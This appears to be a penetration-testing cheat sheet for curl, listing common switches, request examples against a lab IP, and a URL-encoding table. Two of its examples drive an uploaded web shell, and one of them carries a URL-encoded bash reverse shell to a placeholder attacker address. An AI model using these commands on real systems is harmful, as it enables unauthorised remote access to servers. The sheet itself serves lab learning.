# Curl Cheat Sheet

## Syntax
```
curl [options] [URL]
```

---

## Key Switches

| Switch | Description |
|---|---|
| `-I` or `--head` | Fetch headers only |
| `-i` | Include headers in output |
| `-v` | Verbose — shows full request and response |
| `-s` | Silent — suppress progress output |
| `-o [file]` | Save output to file |
| `-O` | Save with remote filename |
| `-L` | Follow redirects |
| `-X [method]` | Set HTTP method (GET, POST, PUT, DELETE) |
| `-d [data]` | Send POST data |
| `-H [header]` | Add custom header |
| `-u user:pass` | Basic authentication |
| `-k` | Skip TLS certificate verification |
| `-b [cookie]` | Send cookie |
| `-c [file]` | Save cookies to file |

---

## Common Combos

```bash
# Check response headers
curl -I http://10.10.10.5

# Full request/response verbose output
curl -v http://10.10.10.5

# Send a reverse shell via web shell
curl "http://10.10.10.5/uploads/shell.php?cmd=whoami"

# Reverse shell via web shell (URL encoded)
curl "http://10.10.10.5/uploads/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"

# POST request with data
curl -X POST -d "username=admin&password=admin" http://10.10.10.5/login

# POST with JSON
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin"}' http://10.10.10.5/api

# Send request with custom header (e.g. auth token)
curl -H "Authorization: Bearer TOKEN" http://10.10.10.5/api/users

# Follow redirect and save output
curl -L -o output.html http://10.10.10.5
```

---

## URL Encoding Reference

| Character | Encoded |
|---|---|
| Space | `+` or `%20` |
| `&` | `%26` |
| `=` | `%3D` |
| `/` | `%2F` |
| `"` | `%22` |

---

## Notes
- `-v` is your best friend for debugging — shows exactly what was sent and received
- Wrap URLs containing `&` or special characters in quotes
- Use `-I` for quick header recon — reveals server type, tech stack, cookies

